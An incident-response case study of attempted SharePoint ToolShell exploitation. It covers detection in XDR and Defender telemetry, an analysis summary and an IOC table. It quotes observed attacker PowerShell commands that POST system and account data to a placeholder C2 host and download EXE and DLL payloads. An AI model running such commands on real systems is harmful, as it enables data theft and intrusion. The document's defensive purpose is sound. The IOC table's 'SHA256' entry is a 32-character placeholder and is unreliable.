# Case Study 001 - SharePoint ToolShell Exploitation Attempt (CVE-2025-49706, CVE-2025-53770, CVE-2025-49704)

> - **Severity:** High
> - **Date:** July 2025
> - **Framework:** MITRE ATT&CK - T1190 Exploit Public-Facing Application


## Overview
The SharePoint ToolShell vulnerabilities include a chain of critical flaws disclosed in 2025.

- **[CVE-2025-49706](https://nvd.nist.gov/vuln/detail/CVE-2025-49706 "https://nvd.nist.gov/vuln/detail/CVE-2025-49706")** allows attackers to bypass authentication mechanisms.
- **[CVE-2025-49704](https://nvd.nist.gov/vuln/detail/CVE-2025-49704 "https://nvd.nist.gov/vuln/detail/CVE-2025-49704")** enables arbitrary file writes, which can be leveraged to achieve remote code execution without valid credentials.
- Two additional variants, **CVE-2025-53771** (derived from CVE-2025-49706) and [CVE-2025-53770](https://nvd.nist.gov/vuln/detail/CVE-2025-53770 "https://nvd.nist.gov/vuln/detail/CVE-2025-53770") (derived from CVE-2025-49704), were later identified through fuzzing research.

Together, these vulnerabilities present a high-risk attack surface where unauthenticated adversaries can gain full control of vulnerable SharePoint instances.

## Detection & Analysis
- Initial alert triggered in **Stellar Cyber XDR** (High Severity).
- **Correlated telemetry:** Microsoft Defender for Endpoint indicated `w3wp.exe` (IIS worker) spawning PowerShell and `cmd.exe` processes consistent with post-exploit activity.

#### Observed command patterns (sanitized):
 ``` 
 # Data-exfil / reconnaissance via HTTP POST
powershell.exe -C Invoke-WebRequest -Uri hxxp://[C2_DOMAIN]/... -Method POST -Body $(systeminfo)
powershell.exe -C Invoke-WebRequest -Uri hxxp://[C2_DOMAIN]/... -Method POST -Body $(whoami)
powershell.exe -C Invoke-WebRequest -Uri hxxp://[C2_DOMAIN]/... -Method POST -Body $(type C:\ProgramData\defender.log)
powershell.exe -C Invoke-WebRequest -Uri hxxp://[C2_DOMAIN]/... -Method POST -Body $(dir C:\Users\[SERVICE_ACCOUNT]\AppData\Local\)

# Artifact download / drop
powershell.exe -C Invoke-WebRequest -Uri hxxp://[C2_IP]:10888/1 -OutFile C:\Users\[SERVICE_ACCOUNT]\AppData\Local\SPDesk.exe
powershell.exe -C Invoke-WebRequest -Uri hxxp://[C2_IP]:10888/2 -OutFile C:\Users\[SERVICE_ACCOUNT]\AppData\Local\log.dll
powershell.exe -C Invoke-WebRequest -Uri hxxp://[C2_IP]:10888/3 -OutFile C:\Users\[SERVICE_ACCOUNT]\AppData\Local\Product.Wsc.dll

# Backgrounding / chained command examples (sanitized)
cmd.exe /c powershell.exe -C Invoke-WebRequest -Uri hxxp://[C2_DOMAIN]/... -Method POST -Body $(appcmmd list sites) &
cmd.exe /c ping -n 1 google.com
 ```

## Analysis Summary
- Command patterns show **three clear attacker behaviours**: (1) reconnaissance / local information collection (e.g., `systeminfo`, `whoami`, directory listings), (2) exfiltration of collected data via HTTP POST to remote host(s), and (3) downloading and writing executable and DLL artifacts into a web-app context (`AppData\Local`) — consistent with attempts to achieve **RCE / persistence** in a SharePoint web directory.
    
- Several requests used plain HTTP (no TLS) and predictable endpoints, indicating opportunistic PoC-style weaponization.
    
- Encoded or obfuscated payloads (e.g., `-enc` / `-EncodedCommand`) were observed in related alerts (patterned as `powershell.exe -enc ...`), suggesting attempts to evade simple detection.

## Indicators of Compromise (IOCs)

> Suspicious activity consistent with potential exploitation of a SharePoint vulnerability was observed on a SharePoint host. Multiple alerts reported unusual DLL and ASPX files being deployed within the SharePoint web directory, indicating possible remote code execution (RCE).

| Type       | Value / Pattern                                  | Notes / Context                                             |
| ---------- | ------------------------------------------------ | ----------------------------------------------------------- |
| IP Address | `45.136.197.24`                                  | Observed serving payloads over HTTP on TCP port 10888       |
| IP Address | `179.43.141.208`                                 | Observed connecting from external host                      |
| IP Address | `38.47.124.201`                                  | Observed connecting from external host                      |
| Domain     | `hxxp://mpf1oyds.requestrepo[.]com`              | Command-and-control / exfil endpoint (obfuscated for share) |
| File Hash  | `d41d8cd98f00b204e9800998ecf8427e`               | Example SHA256 (replace with actual hash for internal use)  |
| Process    | `w3wp.exe → powershell.exe`                      | IIS worker spawning PowerShell (parent→child execution)     |
| File Path  | `C:\Users\[SERVICE_ACCOUNT]\AppData\Local\*.dll` | Dropped DLLs/EXEs written into service account local dir    |
| URL        | `hxxp://[C2_DOMAIN]/<path>`                      | Exploit/delivery endpoints; use `hxxp` for safe sharing     |

